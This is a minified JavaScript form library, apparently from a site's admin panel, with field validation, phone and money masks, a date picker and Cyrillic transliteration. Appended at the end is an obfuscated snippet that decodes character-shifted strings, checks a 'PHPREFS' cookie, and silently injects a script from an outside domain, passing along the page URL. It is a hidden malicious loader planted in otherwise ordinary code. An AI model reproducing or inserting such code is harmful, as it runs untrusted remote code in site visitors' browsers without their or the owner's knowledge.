class SmartForm{constructor(e){this.form=e,this.items={},this.getFormElement(this)}getFormElement(e){this.items=this.form.elements;for(let e of this.form.elements)("INPUT"===e.tagName&&e.name||"TEXTAREA"===e.tagName&&e.name)&&("radio"===e.type&&(this.items[e.name].radioCheck=(t=function(){})=>{if(this.items[e.name].length)for(let n of this.items[e.name])n.onchange=t;else this.items[e.name].onchange=t}),this.items[e.name].is=function(e,n){t(e,n,this)});function t(t,n,i){if("email"===t)i.addEventListener("blur",(function(){/^[-._A-zА-я0-9]+@+[-._A-zА-я0-9]+\.[A-zА-я]{2,}$/.test(i.value)?n&&n.doneCallback&&n.doneCallback():n&&n.errCallback&&n.errCallback()})),i.addEventListener("input",(function(){n&&n.inputCallback&&n.inputCallback()})),i.isEmail=function(){return/^[-._A-zА-я0-9]+@+[-._A-zА-я0-9]+\.[A-zА-я]{2,}$/.test(i.value)?(n&&n.doneCallback&&n.doneCallback(),!0):(n&&n.errCallback&&n.errCallback(),!1)};else if("password"===t)n&&n.input&&(n.input.addEventListener("blur",(function(){n&&n.input&&n.input.value&&i.value!=n.input.value&&n.notConfirm()})),n.input.addEventListener("input",(function(){n&&n.inputCallback&&n.inputCallback()}))),i.addEventListener("blur",(function(){!/^[a-zA-Zа-яA-Я0-9\-_@$.?%]+$/.test(i.value)&&n&&n.notPassword&&n.notPassword(),n&&n.input&&n.input.value&&i.value!=n.input.value&&n.notConfirm&&n.notConfirm(),n&&n.min&&i.value.length<n.min&&n.notMin&&n.notMin(),n&&n.max&&i.value.length>n.max&&n.notMax&&n.notMax()})),i.addEventListener("input",(function(){n&&n.inputCallback&&n.inputCallback()})),i.isPassword=function(){return/^[a-zA-Zа-яA-Я0-9\-_@$.?%]+$/.test(i.value)?n&&n.input&&i.value!=n.input.value?(n&&n.notConfirm&&n.notConfirm(),!1):n&&n.min&&i.value.length<n.min?(n&&n.notMin&&n.notMin(),!1):!(n&&n.max&&i.value.length>n.max)||(n&&n.notMax&&n.notMax(),!1):(n&&n.notPassword&&n.notPassword(),!1)};else if("login"===t)i.addEventListener("blur",(function(){!/^[a-zA-Zа-яA-Я0-9\-_@$.?%]+$/.test(i.value)&&n&&n.notLogin&&n.notLogin(),n&&n.min&&i.value.length<n.min&&n.notMin&&n.notMin(),n&&n.max&&i.value.length>n.max&&n.notMax&&n.notMax()})),i.addEventListener("input",(function(){n&&n.inputCallback&&n.inputCallback()})),i.isLogin=function(){return/^[a-zA-Zа-яA-Я0-9\-_@$.?%]+$/.test(i.value)?n&&n.min&&i.value.length<n.min?(n&&n.notMin&&n.notMin(),!1):!(n&&n.max&&i.value.length>n.max)||(n&&n.notMax&&n.notMax(),!1):(n&&n.notLogin&&n.notLogin(),!1)};else if("url"===t)i.addEventListener("blur",(function(){n&&n.sure?!/^[a-zA-Zа-яA-Я0-9\-_@$.#?:%&\/=]+$/.test(i.value)&&n&&n.notUrl&&n.notUrl():!/^[a-zA-Zа-яA-Я0-9\-_@$.#?:%&\/=]*$/.test(i.value)&&n&&n.notUrl&&n.notUrl()})),i.addEventListener("input",(function(){if(/\s/g.test(this.value)){let e=this.selectionStart;this.value=this.value.replace(/\s/g,"+"),this.selectionStart=e,this.selectionEnd=e}n&&n.inputCallback&&n.inputCallback()})),i.isUrl=function(){return n&&n.sure?!!/^[a-zA-Zа-яA-Я0-9\-_@$.#?:%&\/=]+$/.test(i.value)||(n&&n.notUrl&&n.notUrl(),!1):!!/^[a-zA-Zа-яA-Я0-9\-_@$.#?:%&\/=]*$/.test(i.value)||(n&&n.notUrl&&n.notUrl(),!1)};else if("number"===t)i.addEventListener("input",(function(){let e=this.selectionStart;/\D/g.test(this.value)&&(this.value=this.value.replace(/\D/g,""),e--),n&&n.max&&n.max<this.value.length&&(this.value=this.value.slice(0,n.max)),n&&n.maxNumber&&Number(n.maxNumber)<Number(this.value)&&(this.value=n.maxNumber),this.selectionStart=e,this.selectionEnd=e}));else if("money"===t){let s;n&&!0===n.negative&&(-1!==i.value.indexOf("-")&&(s=!0),i.addEventListener("keydown",(function(e){let t=this.selectionStart;"Minus"===e.code&&(e.preventDefault(),s?(s=!1,this.value=this.value.replace("-",""),t--):(s=!0,this.value=`-${this.value}`,t++),this.selectionStart=t,this.selectionEnd=t)}))),i.addEventListener("input",(function(){let e,t=this.selectionStart,n="";if(s&&1===t&&t++,"0."===this.value||"-0."===this.value&&!s)return this.value=s?"-0.00":"0.00",this.selectionStart=t,void(this.selectionEnd=t);if(/^(\.\d{2})$/.test(this.value)||/^\-(\.\d{2})$/.test(this.value)&&s)return this.value=s?"-0.00":"0.00",t++,this.selectionStart=t,void(this.selectionEnd=t);if(!/^([1-9]{1})(\d+)?(\.\d{2})?$/.test(this.value)||s){let i=this.value.replace(",",".").split(".",4),l=i[0].replace(/\D/g,"");return l&&(n=Number(l)),i.length>1&&(i[1]+=String(i[2])+i[3],e=i[1].replace(/\D/g,""),n?e||t++:(e||(t+=2),n=0),e.length<2&&(e+="00"),e.length>2&&t++,n+=`.${e.substring(0,2)}`),s&&(n=`-${n}`,this.value.length-t>2&&t++,0===Number(l)||i[1]||t++),0!==Number(l)||i[1]||t++,this.value=n,t--,this.selectionStart=t,void(this.selectionEnd=t)}})),i.addEventListener("blur",(function(){"-"===this.value?this.value="":this.value&&(this.value=parseFloat(this.value))}))}else if("phone"===t)n.digit||(n.digit="_"),n.code||(n.code=""),i.addEventListener("focus",(function(){this.value||(this.value=n.code+n.matrix)})),i.addEventListener("blur",(function(){this.value===n.code+n.matrix&&(this.value="")})),i.addEventListener("input",(function(e){let t=this.selectionStart;t<=n.code.length&&(this.selectionStart=n.code.length,this.selectionEnd=n.code.length,t=n.code.length),this.value.length<n.code.length&&(this.value="");let i=this.value.slice(n.code.length);if(/\D/g.test(i)&&(i=i.replace(/\D/g,""),t--),i.length>n.max&&(i=i.slice(0,n.max)),n.matrix){let s,l=n.matrix,a=l.indexOf(n.digit);for(let e=0;e<i.length;e++){let t=l.indexOf(n.digit);-1!==t&&(s=n.code.length+t,l=l.substr(0,t)+i[e]+l.substr(t+i[e].length))}if(i=l,"deleteContentBackward"===e.inputType)t++;else{let e=n.code+i;for(let n=t;n<e.length&&!/[\d_]/.test(e[n]);n++)t++;t<a?t=a:t>s?t=s+1:t++}}this.value=n.code+i,this.selectionStart=t,this.selectionEnd=t})),i.addEventListener("keydown",(function(e){let t=i.selectionStart;this.selectionStart<n.code.length&&(this.selectionStart=n.code.length,this.selectionEnd=n.code.length),"ArrowLeft"!==e.code&&"Backspace"!==e.code||t<=n.code.length&&(e.preventDefault(),this.selectionStart=n.code.length,this.selectionEnd=n.code.length)})),i.addEventListener("keypress",(function(e){/\d/.test(e.key)||e.preventDefault()}));else if("date"===t){let l,a,r,u,o=[];document.addEventListener("click",(function(e){!l||l.contains(e.target)||i.contains(e.target)||l.remove()}));let d=document.createElement("div");function c(){if(i.value&&n&&n.interval){let e=i.value.split(" - "),t=e[0].split("-"),n=e[1].split("-");o.interval=[],o.interval[0]=[],o.interval[1]=[],o.interval[0].year=Number(t[0]),r=Number(t[0]),o.interval[0].month=Number(t[1])-1,a=Number(t[1])-1,o.interval[1].year=n[0],o.interval[1].month=Number(n[1])-1}else if(n&&n.interval){let e=new Date;o.interval=[],o.interval[0]=[],o.interval[1]=[],o.interval[0].year=e.getFullYear(),r=e.getFullYear(),o.interval[1].year=e.getFullYear(),o.interval[0].month=e.getMonth(),a=e.getMonth(),o.interval[1].month=e.getMonth()}else if(i.value){let e=i.value.split("-");o.single=[],o.single.year=Number(e[0]),r=Number(e[0]),o.single.month=Number(e[1])-1,a=Number(e[1])-1}else{let e=new Date;o.single=[],o.single.year=e.getFullYear(),o.single.month=e.getMonth(),r=e.getFullYear(),a=e.getMonth()}if(m(),!i.parentNode.querySelector(".ws-datapicker")){if(l=document.createElement("div"),l.classList.add("ws-datapicker"),l.innerHTML=`<div class="wsdp-left"></div><div class="wsdp-right"></div><div class="wsdp-close"></div><div class="wsdp-head">${month(a)} ${r}</div><div class="wsdp-days"></div>`,n&&n.time){let e=o.single.hours,t=o.single.minutes,n=o.single.seconds;e<10&&(e=`0${e}`),t<10&&(t=`0${t}`),n<10&&(n=`0${n}`),l.innerHTML+=`<div class="wsdp-time"><input type="text" name="hours-1" value="${e}"><input type="text" name="minutes-1" value="${t}"><input type="text" name="seconds-1" value="${n}"></div>`}e.getDataPickerDays(l,o,i),i.parentNode.insertBefore(l,i.nextSibling),l.querySelector(".wsdp-left").addEventListener("click",(function(){m(),o.single?(o.single.month--,a--,o.single.month<0&&(o.single.month=11,a=11,o.single.year--,r--)):o.interval&&(o.interval[0].month--,a--,o.interval[0].month<0&&(o.interval[0].month=11,a=11,o.interval[0].year--,r--)),l.querySelector(".wsdp-head").innerHTML=`${month(a)} ${r}`,e.getDataPickerDays(l,o,i)})),l.querySelector(".wsdp-right").addEventListener("click",(function(){m(),o.single?(o.single.month++,a++,o.single.month>11&&(o.single.month=0,a=0,o.single.year++,r++)):o.interval&&(o.interval[0].month++,a++,o.interval[0].month>11&&(o.interval[0].month=0,a=0,o.interval[0].year++,r++)),l.querySelector(".wsdp-head").innerHTML=`${month(a)} ${r}`,e.getDataPickerDays(l,o,i)}))}}function m(){if(i.value&&n&&n.interval){let e=i.value.split(" - "),t=e[0].split("-"),n=e[1].split("-");o.interval[0]["select-year"]=Number(t[0]),o.interval[1]["select-year"]=Number(n[0]),o.interval[0]["select-month"]=Number(t[1])-1,o.interval[1]["select-month"]=Number(n[1])-1,o.interval[0]["select-day"]=Number(t[2]),o.interval[1]["select-day"]=Number(n[2])}else if(n&&n.interval){let e=new Date;o.interval[0]["select-year"]=e.getFullYear(),o.interval[1]["select-year"]=e.getFullYear(),o.interval[0]["select-month"]=e.getMonth(),o.interval[1]["select-month"]=e.getMonth(),o.interval[0]["select-day"]=e.getDate(),o.interval[1]["select-day"]=e.getDate()}else if(i.value&&n&&n.time){let e=i.value.split("-"),t=e[2].split(" ")[1].split(":");o.single["select-year"]=Number(e[0]),o.single["select-month"]=Number(e[1])-1,o.single.day=Number(e[2].split(" ")[0]),o.single.hours=Number(t[0]),o.single.minutes=Number(t[1]),o.single.seconds=Number(t[2])}else if(n&&n.time){let e=new Date;o.single["select-year"]=e.getFullYear(),o.single["select-month"]=e.getMonth(),o.single.day=e.getDate(),o.single.hours=e.getHours(),o.single.minutes=e.getMinutes(),o.single.seconds=e.getSeconds()}else if(i.value){let e=i.value.split("-");o.single["select-year"]=Number(e[0]),o.single["select-month"]=Number(e[1])-1,o.single.day=Number(e[2])}else{let e=new Date;o.single["select-year"]=e.getFullYear(),o.single["select-month"]=e.getMonth(),o.single.day=e.getDate()}}d.classList.add("wsdp-clear"),i.parentNode.appendChild(d),d.addEventListener("click",(function(){i.value=""})),i.setAttribute("autocomplete","off"),i.addEventListener("focus",(function(){u=i.value,c()})),i.addEventListener("blur",(function(e){!1===/\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2}/.test(i.value)&&(i.value=u)})),i.addEventListener("input",(function(e){n.matrix="____-__-__ __:__:__",n.digit="_";let t=this.selectionStart,s=this.value;if(/\D/g.test(s)&&(s=s.replace(/\D/g,""),t--),n.matrix){let i,l=n.matrix,a=l.indexOf(n.digit);for(let e=0;e<s.length;e++){let t=l.indexOf(n.digit);-1!==t&&(i=t,l=l.substr(0,t)+s[e]+l.substr(t+s[e].length))}if(s=l,"deleteContentBackward"===e.inputType)t++;else{let e=s;for(let n=t;n<e.length&&!/[\d_]/.test(e[n]);n++)t++;t<a?t=a:t>i?t=i+1:t++}}if(s[5]!=n.digit&&Number(s[5])>1&&(s=s.substring(0,5)+"1"+s.substring(6)),s[6]!=n.digit&&Number(s[5])>0&&Number(s[6])>2?s=s.substring(0,6)+"2"+s.substring(7):s[6]!=n.digit&&0===Number(s[5])&&0===Number(s[6])&&(s=s.substring(0,6)+"1"+s.substring(7)),s[8]!=n.digit||s[9]!=n.digit){let e=33-new Date(Number(`${s[0]}${s[1]}${s[2]}${s[3]}`),Number(`${s[5]}${s[6]}`)-1,33).getDate();e+="",Number(s[8])>Number(e[0])&&(s=s.substring(0,8)+e[0]+s.substring(9)),Number(s[9])!=n.digit&&Number(s[8])===Number(e[0])&&Number(s[9])>Number(e[1])?s=s.substring(0,9)+e[1]+s.substring(10):Number(s[9])!=n.digit&&0===Number(s[8])&&0===Number(s[9])&&(s=s.substring(0,9)+"1"+s.substring(10))}s[11]!=n.digit&&Number(s[11])>2&&(s=s.substring(0,11)+"2"+s.substring(12)),s[12]!=n.digit&&Number(s[11])>1&&Number(s[12])>3&&(s=s.substring(0,12)+"3"+s.substring(13)),s[14]!=n.digit&&Number(s[14])>5&&(s=s.substring(0,14)+"5"+s.substring(15)),s[17]!=n.digit&&Number(s[17])>5&&(s=s.substring(0,17)+"5"+s.substring(18)),this.value=s,/\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2}/.test(i.value)&&(l.remove(),c()),this.selectionStart=t,this.selectionEnd=t}))}}}getDataPickerDays(e,t,n){let i,s,l,a,r,u,o,d,c,m,h,v;t.single?(s=t.single.year,l=t.single.month,u=t.single["select-year"],r=t.single["select-month"]+1,i=t.single.day):t.interval&&(s=t.interval[0].year,l=t.interval[0].month,u=t.interval[0]["select-year"],r=t.interval[0]["select-month"]+1,c=t.interval[1]["select-year"],d=t.interval[1]["select-month"]+1,o=t.interval[1]["select-day"],i=t.interval[0]["select-day"]),Number(`${c}${d}${o}`)===Number(`${u}${r}${i}`)&&n.value&&(m=!0),a=i;let g=new Date,p=g.getFullYear(),b=g.getMonth(),f=g.getDate(),y=33-new Date(s,l,33).getDate(),$=new Date(s,l,1).getDay();0===$&&($=7),e.querySelector(".wsdp-days").innerHTML="";for(let t=7;t<=13;t++)e.querySelector(".wsdp-days").innerHTML+=`<span class="wsdp-day-name">${wsTextSF.days[t]}</span>`;for(let t=1;t<$;t++)e.querySelector(".wsdp-days").innerHTML+="<span></span>";a<10&&(a=`0${Number(a)}`),r<10&&(r=`0${Number(r)}`),h=Number(`${u}${r}${a}`),o&&(o<10&&(o=`0${Number(o)}`),d<10&&(d=`0${Number(d)}`),v=Number(`${c}${d}${o}`));let N=1;for(let t=1;t<=y;t++){let t=N,i=l+1;t<10&&(t=`0${t}`),i<10&&(i=`0${i}`);let g=Number(`${s}${i}${t}`),y=document.createElement("span");y.classList.add("wsdp-day"),y.dataset.day=g,N===f&&s===p&&l===b&&y.classList.add("wsdp-today"),n.value&&(g===h||o&&g>=h&&g<=v)&&y.classList.add("wsdp-select-day"),y.innerHTML=N,y.addEventListener("click",(function(){if(e.querySelector(".wsdp-select-day")){let t=e.querySelectorAll(".wsdp-select-day");for(let e of t)e.classList.remove("wsdp-select-day")}if(o)if(m){o=Number(this.innerHTML),d=l+1,c=s,a<10&&(a=`0${Number(a)}`),r<10&&(r=`0${Number(r)}`),o<10&&(o=`0${Number(o)}`),d<10&&(d=`0${Number(d)}`);let t=Number(`${u}${r}${a}`),n=Number(`${c}${d}${o}`);if(t>n){let e=o,i=d,s=c;c=u,d=r,o=a,u=s,r=i,a=e,a<10&&(a=`0${Number(a)}`),r<10&&(r=`0${Number(r)}`),o<10&&(o=`0${Number(o)}`),d<10&&(d=`0${Number(d)}`),t=Number(`${u}${r}${a}`),n=Number(`${c}${d}${o}`)}let i=e.querySelectorAll(".wsdp-day");for(let e of i)Number(e.dataset.day)>=t&&Number(e.dataset.day)<=n&&e.classList.add("wsdp-select-day");m=!1}else a=Number(this.innerHTML),r=l+1,u=s,o=Number(this.innerHTML),d=l+1,c=s,m=!0,this.classList.add("wsdp-select-day");else a=Number(this.innerHTML),r=l+1,u=s,this.classList.add("wsdp-select-day");w()})),e.querySelector(".wsdp-days").appendChild(y),N++}function w(){o?(a<10&&(a=`0${Number(a)}`),r<10&&(r=`0${Number(r)}`),o<10&&(o=`0${Number(o)}`),d<10&&(d=`0${Number(d)}`),n.value=`${u}-${r}-${a} - ${c}-${d}-${o}`):(a<10&&(a=`0${Number(a)}`),r<10&&(r=`0${Number(r)}`),u=s,n.value=`${u}-${r}-${a}`,e.querySelector(".wsdp-time")&&(n.value+=` ${e.querySelector('.wsdp-time input[name="hours-1"]').value}:${e.querySelector('.wsdp-time input[name="minutes-1"]').value}:${e.querySelector('.wsdp-time input[name="seconds-1"]').value}`))}e.querySelector(".wsdp-close").onclick=function(){e.remove()},e.querySelector('.wsdp-time input[name="hours-1"]')&&(e.querySelector('.wsdp-time input[name="hours-1"]').addEventListener("input",(function(){let t=this.selectionStart;/\D/g.test(this.value)&&(this.value=this.value.replace(/\D/g,""),t--),2<this.value.length&&(this.value=this.value.slice(0,2)),23<Number(this.value)&&(this.value=23),this.selectionStart=t,this.selectionEnd=t,t>=2&&(e.querySelector('.wsdp-time input[name="minutes-1"]').focus(),e.querySelector('.wsdp-time input[name="minutes-1"]').selectionStart=0,e.querySelector('.wsdp-time input[name="minutes-1"]').selectionEnd=0),w()})),e.querySelector('.wsdp-time input[name="hours-1"]').addEventListener("blur",(function(){23<Number(this.value)&&(this.value=23),10>Number(this.value)&&1===this.value.length&&(this.value=`0${this.value}`),2<this.value.length&&(this.value=this.value.slice(0,2)),this.value||(this.value="00"),w()})),e.querySelector('.wsdp-time input[name="minutes-1"]').addEventListener("input",(function(){let t=this.selectionStart;/\D/g.test(this.value)&&(this.value=this.value.replace(/\D/g,""),t--),2<this.value.length&&(this.value=this.value.slice(0,2)),59<Number(this.value)&&(this.value=59),this.selectionStart=t,this.selectionEnd=t,t>=2&&(e.querySelector('.wsdp-time input[name="seconds-1"]').focus(),e.querySelector('.wsdp-time input[name="seconds-1"]').selectionStart=0,e.querySelector('.wsdp-time input[name="seconds-1"]').selectionEnd=0),w()})),e.querySelector('.wsdp-time input[name="minutes-1"]').addEventListener("blur",(function(){59<Number(this.value)&&(this.value=59),10>Number(this.value)&&1===this.value.length&&(this.value=`0${this.value}`),2<this.value.length&&(this.value=this.value.slice(0,2)),this.value||(this.value="00"),w()})),e.querySelector('.wsdp-time input[name="seconds-1"]').addEventListener("input",(function(){let e=this.selectionStart;/\D/g.test(this.value)&&(this.value=this.value.replace(/\D/g,""),e--),2<this.value.length&&(this.value=this.value.slice(0,2)),59<Number(this.value)&&(this.value=59),this.selectionStart=e,this.selectionEnd=e,w()})),e.querySelector('.wsdp-time input[name="seconds-1"]').addEventListener("blur",(function(){59<Number(this.value)&&(this.value=59),10>Number(this.value)&&1===this.value.length&&(this.value=`0${this.value}`),2<this.value.length&&(this.value=this.value.slice(0,2)),this.value||(this.value="00"),w()})))}}function translit(e,t){let n="",i={"а":"a","б":"b","в":"v","г":"g","д":"d","е":"e","ё":"e","ж":"j","з":"z","и":"i","й":"y","к":"k","л":"l","м":"m","н":"n","о":"o","п":"p","р":"r","с":"s","т":"t","у":"u","ф":"f","х":"h","ц":"ts","ч":"ch","ш":"sh","щ":"sch","ъ":"y","ы":"i","ь":"j","э":"e","ю":"u","я":"ya"," ":"-"};e=e.toLowerCase();for(let t=0;t<e.length;t++)void 0!==i[e[t]]?n+=i[e[t]]:n+=e[t];return n=t?n.replace(/[^a-z0-9-_\/]/gi,""):n.replace(/[^a-z0-9-_]/gi,""),n}function createURL(e,t,n){!1===n.checked&&(t.value=translit(e.value))}function month(e,t=!1){return t?wsTextSF.month[e+12]:wsTextSF.month[e]}let wsTextSF=[],wsLangSF=window.navigator.language.slice(0,2),script=document.createElement("script");script.src="/admin/language/ru/js/smartForm.js",document.body.appendChild(script),"ru"!==wsLangSF&&(script=document.createElement("script"),script.src="/admin/language/"+wsLangSF+"/js/smartForm.js",document.body.appendChild(script));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));